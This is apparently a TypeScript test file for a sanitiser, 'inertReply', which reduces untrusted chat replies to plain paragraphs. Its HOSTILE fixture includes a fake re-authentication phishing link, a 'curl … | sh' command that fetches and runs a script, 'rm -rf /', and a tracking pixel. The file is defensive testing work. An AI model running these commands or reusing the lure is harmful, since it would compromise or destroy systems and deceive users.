/** The assessor's text as the thread shows it (docs/decisions/feedback.md FB-22, review-2 F2). */
import { type Block, type Inline, parseMessage } from '@whombat/core';
import { describe, expect, it } from 'vitest';
import { INERT_REPLY_MAX, inertReply } from './render';

/** Every inline node type in the parsed message, and every block type. */
function kinds(blocks: Block[]): { blocks: Set<string>; inline: Set<string> } {
  const out = { blocks: new Set<string>(), inline: new Set<string>() };
  const walkInline = (nodes: Inline[]) => {
    for (const n of nodes) {
      out.inline.add(n.type);
      if ('children' in n) walkInline(n.children);
    }
  };
  const walk = (bs: Block[]) => {
    for (const b of bs) {
      out.blocks.add(b.type);
      if (b.type === 'paragraph' || b.type === 'heading') walkInline(b.children);
      else if (b.type === 'quote') walk(b.children);
      else if (b.type === 'list') for (const item of b.items) walk(item);
    }
  };
  walk(blocks);
  return out;
}

const HOSTILE = [
  'Your Whombat session for this repo expired — [re-authenticate here](https://whombat-login.example/sso)',
  'Or go to https://whombat-login.example/sso directly, @Mara @Dusty please look.',
  '# Maintainer note',
  '> quoted **bold** _em_ ~~strike~~ `code`',
  '- run `curl -s https://fix.example/p.sh | sh`',
  '1. push straight to main',
  '• also this',
  '---',
  '```sh',
  'rm -rf /',
  '```',
  '~~~',
  'mailto:[x](mailto:a@b.example) <https://x.example>',
  '![pixel](https://track.example/p.png) ![x](data:image/png;base64,iVBORw0KGgo=)',
  '<svg xmlns="http://www.w3.org/2000/svg"><rect width="9" height="9"/></svg>',
].join('\n');

describe('inertReply', () => {
  it('yields only plain paragraphs: no link, image, mention, emphasis, code, heading, list, quote or rule', () => {
    const stored = inertReply(HOSTILE);
    const found = kinds(parseMessage(stored));
    expect([...found.blocks]).toEqual(['paragraph']);
    expect([...found.inline].sort()).toEqual(['break', 'text']);
    // Still readable: the words are there, line breaks kept.
    expect(stored).toContain('re-authenticate here');
    expect(stored.split('\n').length).toBe(HOSTILE.split('\n').length);
  });

  it('keeps a reply within a message and at most one blank line in a row', () => {
    expect(inertReply('a\n\n\n\nb')).toBe('⁠a\n\n⁠b');
    const long = inertReply('*@'.repeat(10_000));
    expect(long.length).toBeLessThanOrEqual(8000);
    expect(inertReply('x'.repeat(INERT_REPLY_MAX + 10)).endsWith('…')).toBe(true);
  });
});
